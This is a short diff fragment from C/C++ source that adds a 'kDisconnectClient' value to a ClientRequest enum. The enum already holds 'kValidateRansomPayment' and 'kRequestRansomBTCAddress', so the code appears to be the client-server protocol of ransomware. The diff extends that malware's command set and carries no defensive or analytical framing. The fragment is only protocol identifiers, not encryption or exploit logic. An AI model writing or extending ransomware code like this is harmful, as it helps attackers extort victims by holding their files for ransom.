@@ -160,6 +160,7 @@ struct ClientRequest {
         kValidateRansomPayment,
         kRequestRansomBTCAddress,
         kPing,
+        kDisconnectClient,
     };
 
     BOOL              valid;
